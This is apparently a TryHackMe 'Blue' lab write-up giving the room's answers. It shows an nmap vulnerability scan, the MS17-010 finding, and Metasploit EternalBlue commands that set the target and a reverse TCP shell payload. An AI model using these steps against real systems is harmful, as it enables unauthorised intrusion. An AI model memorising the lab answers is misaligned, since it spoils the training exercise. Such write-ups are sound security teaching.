# TryHackMe - Blue

> Feburary 16, 2022

## Task 1: Recon

1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)

        nmap -sC -sV --script vuln -oN nmap/inital 10.10.67.116

2. How many ports are open with a port number under 1000?

        3

3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

        MS17-010

## Task 2: Gain Access

1. Start Metasploit

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

    search eternal
        
        exploit/windows/smb/ms17_010_eternalblue

3. Show options and set the one required value. What is the name of this value? (All caps for submission)

    use 0
    show options
    set rhosts 10.10.67.116
    run

        RHOSTS

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

    set payload windows/x64/shell/reverse_tcp

With that done, run the exploit!

Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 
